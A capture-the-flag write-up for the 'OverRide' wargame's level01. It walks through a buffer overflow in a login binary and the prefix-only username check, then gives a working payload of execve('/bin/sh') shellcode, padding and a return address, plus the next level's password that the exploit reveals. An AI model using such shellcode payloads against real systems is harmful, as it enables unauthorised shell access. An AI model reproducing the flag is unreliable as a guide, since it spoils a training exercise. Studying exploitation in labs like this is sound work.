## level01

At first glance this looks like a basic login prompt with username/password checks. The logic seems simple:
- username must match `dat_wil`
- password must match `admin`

However, whatever password we give, the program displays `nope, incorrect password...`:

```console
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: test
verifying username....

nope, incorrect username...

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
password
nope, incorrect password...

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
admin
nope, incorrect password...
```

Even if we passed the check, the program immediately terminates so that wouldn't help us achieve privilege escalation anyway.

The real vulnerability comes from a buffer overflow. The password buffer is 64 bytes long but `fgets` is called with n=100.

To find the address of the overflow, we give a pattern `AAAABBBBCCCC...` to fgets from gdb, which prints the address. The program segfaults at 0x55555555, which corresponds to UUUU, at offset 80 in the password buffer.

```
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
dat_wil
Enter Username: verifying username....

Enter Password: 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

There is another mistake in the program which allows us to store a lot of data in the bss and on the stack. The username and password checks only verify the validity up to the length of the expected value (e.g. `memcmp(a_user_name, "dat_wil", 7)`), meaning that the username `dat_wil12345678` is considered valid.

```console
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil12345678
verifying username....

Enter Password: 
password
nope, incorrect password...
```

The last thing we need is the address of `a_user_name`, where we will store our shellcode:

```console
$ objdump -t level01 | grep user
[...]
0804a040 g     O .bss   00000064              a_user_name
```

It is found at 0x0804a040, so the address of the shellcode will be 0x0804a047, after the string `dat_wil`.

We now have everything we need to construct an attack. The full payload consists of:
- `dat_wil` to pass the username check
- the shellcode (we'll reuse our 23-byte `execve("/bin/sh")` from rainfall)
- 256 - 1 (`fgets` reads n-1 characters) - 7 - 23 + 80 = 305 dummy characters
- the address of the shellcode in little endian

```console
level01@OverRide:~$ (
python -c '
print "dat_wil" + "\x31\xc0\x50\x04\x0b\x68//sh\x68/bin\x89\xe3\x31\xc9\x31\xd2\xcd\x80" + "A" * 305 + "\x47\xa0\x04\x08"
';
echo "cat /home/users/level02/.pass"
) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```